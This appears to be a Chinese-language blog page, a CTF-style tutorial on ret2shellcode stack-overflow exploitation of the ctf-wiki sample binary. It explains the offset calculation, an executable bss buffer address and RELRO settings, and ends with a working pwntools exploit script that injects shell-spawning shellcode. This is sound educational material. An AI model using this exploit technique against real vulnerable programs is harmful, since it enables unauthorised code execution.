@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="ret2shellcoderet2shellcode,基本ROP之一，控制程序执行shellcode。 这段shellcode需要攻击者自己找地方填充。 1、shellcode: 一段能完成某个功能的汇编代码。常见功能是获取目标系统的shell。 2、条件： 由于shellcode需要填充，并且控制程序执行shellcode，故填充的区域需要具有可执行权限。 example 以 github-ct">
+<meta property="og:type" content="article">
+<meta property="og:title" content="stackoverflow之ret2shellcode">
+<meta property="og:url" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/index.html">
+<meta property="og:site_name" content="Rj45mp&#39;s blog">
+<meta property="og:description" content="ret2shellcoderet2shellcode,基本ROP之一，控制程序执行shellcode。 这段shellcode需要攻击者自己找地方填充。 1、shellcode: 一段能完成某个功能的汇编代码。常见功能是获取目标系统的shell。 2、条件： 由于shellcode需要填充，并且控制程序执行shellcode，故填充的区域需要具有可执行权限。 example 以 github-ct">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/image-20191203141522188.png">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/image-20191203142333859.png">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/image-20191203143006919.png">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/image-20191203143915803.png">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/image-20191203144452138.png">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/image-20191203145134757.png">
+<meta property="article:published_time" content="2019-12-03T05:14:04.000Z">
+<meta property="article:modified_time" content="2019-12-03T07:03:22.151Z">
+<meta property="article:author" content="Rj45mp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/image-20191203141522188.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/Rj45mp.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/Rj45mp.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/Rj45mp.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>stackoverflow之ret2shellcode</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/firends/">Firends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/ret2shellcode-test/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/stackoverflow%E4%B9%8Bret2text/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/&text=stackoverflow之ret2shellcode"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/&title=stackoverflow之ret2shellcode"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/&is_video=false&description=stackoverflow之ret2shellcode"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=stackoverflow之ret2shellcode&body=Check out this article: https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/&title=stackoverflow之ret2shellcode"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/&title=stackoverflow之ret2shellcode"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/&title=stackoverflow之ret2shellcode"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/&title=stackoverflow之ret2shellcode"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/&name=stackoverflow之ret2shellcode&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/&t=stackoverflow之ret2shellcode"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">1.</span> <span class="toc-text">ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example"><span class="toc-number">2.</span> <span class="toc-text">example</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RELRO"><span class="toc-number">3.</span> <span class="toc-text">RELRO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">4.</span> <span class="toc-text">pwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-number">5.</span> <span class="toc-text">exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">6.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        stackoverflow之ret2shellcode
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Rj45mp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-12-03T05:14:04.000Z" itemprop="datePublished">2019-12-03</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>ret2shellcode,基本ROP之一，控制程序执行shellcode。</p>
+<p>这段shellcode需要攻击者自己找地方填充。</p>
+<p><strong>1、shellcode:</strong></p>
+<p>一段能完成某个功能的汇编代码。常见功能是获取目标系统的shell。</p>
+<p><strong>2、条件：</strong></p>
+<p>由于shellcode需要填充，并且控制程序执行shellcode，故填充的区域需要具有可执行权限。</p>
+<h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p> 以 github-ctf-wiki中的ret2shellcode样例程序举例： </p>
+<p><img src="/stackoverflow%E4%B9%8Bret2shellcode/image-20191203141522188.png" alt="image-20191203141522188"></p>
+<p>32位的binary，开启了RELR0保护机制。不过只是部分区块只读保护。</p>
+<p><strong>1、IDA</strong></p>
+<p><img src="/stackoverflow%E4%B9%8Bret2shellcode/image-20191203142333859.png" alt="image-20191203142333859"></p>
+<p>可以看到binary存在溢出，同时可以快速知道溢出的相对于ret_addr的偏移量为：</p>
+<p><code>offset=0x64+4+4+4</code>。</p>
+<p>ret2shellcode在该binary上的应用就是：</p>
+<p>将shellcode通过gets函数输入，通过strncpy函数拷贝到buf2空间存储，然后通过溢出劫持控制流到buf2，执行shellcode。</p>
+<p>那么接下来就是如何寻找buf2的地址，和如何调试查看buf2空间是否具有可执行权限的问题了。</p>
+<p>IDA下的buf2地址查看：</p>
+<p><img src="/stackoverflow%E4%B9%8Bret2shellcode/image-20191203143006919.png" alt="image-20191203143006919"></p>
+<p>buf2地址在bss段，<code>0x804a080</code>。</p>
+<p><strong>2、GDB</strong></p>
+<p>对于buf的bss段是否具有可执行权限，其实前面<code>checksec</code>的时候已经知道，以下为具体的调试查看：</p>
+<p>断点于main函数，然后运行binary。</p>
+<p><img src="/stackoverflow%E4%B9%8Bret2shellcode/image-20191203143915803.png" alt="image-20191203143915803"></p>
+<p>可以看到该段具有可读可写可执行权限。</p>
+<h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p><strong>1、简介：</strong></p>
+<p>RELRO(read only relocation),存储只读区保护机制，其分为Partial RELRO和Full RELRO两种形式。</p>
+<p>Partial RELRO，部分存储只读区保护。</p>
+<p>针对部分区块如：<code>.init_array .fini_array .jcr .dynamic .got</code>,在被动态装载（初始化）后，被标记为只读区块。 </p>
+<p>Full RELRO，全部区块存储只读区保护。</p>
+<p><strong>2、原理：</strong></p>
+<p>我们知道在黑客进行栈溢出攻击，并且需要shellcode的情况下，可写的存储区将是黑客的攻击目标(因可将 shellcode写入该存储区，然后通过劫持返回地址到该存储区，即可达到攻击目的)， 这时候减少可写的存储区或者将存储区设置为可读，将大大有效的保护系统的安全性。而RELRO的原理即如此</p>
+<p><strong>3、开关：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc relro.c -o relro    #默认下是Partial RELRO </span><br><span class="line">gcc -z norelro relro.c -o relro #关闭RELRO保护机制 </span><br><span class="line">gcc -z lazy relro.c -o relro    #开启Partial RELRO保护机制 </span><br><span class="line">gcc -z now relro.c -o relro #开启Partial RELRO和Full RELRO保护机制</span><br></pre></td></tr></table></figure>
+
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><p><img src="/stackoverflow%E4%B9%8Bret2shellcode/image-20191203144452138.png" alt="image-20191203144452138"></p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">offset = 0x64+4+4+4</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = 0x804a080</span><br><span class="line">p = process(&quot;./ret2shellcode&quot;)</span><br><span class="line">payload = shellcode.ljust(offset,&#x27;\x90&#x27;)+p32(buf2_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/stackoverflow%E4%B9%8Bret2shellcode/image-20191203145134757.png" alt="image-20191203145134757"></p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p> github-ctf-wiki </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/firends/">Firends</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">1.</span> <span class="toc-text">ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example"><span class="toc-number">2.</span> <span class="toc-text">example</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RELRO"><span class="toc-number">3.</span> <span class="toc-text">RELRO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">4.</span> <span class="toc-text">pwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-number">5.</span> <span class="toc-text">exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">6.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/&text=stackoverflow之ret2shellcode"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/&title=stackoverflow之ret2shellcode"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/&is_video=false&description=stackoverflow之ret2shellcode"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=stackoverflow之ret2shellcode&body=Check out this article: https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/&title=stackoverflow之ret2shellcode"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/&title=stackoverflow之ret2shellcode"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/&title=stackoverflow之ret2shellcode"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/&title=stackoverflow之ret2shellcode"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/&name=stackoverflow之ret2shellcode&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/&t=stackoverflow之ret2shellcode"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    Rj45mp
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/firends/">Firends</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
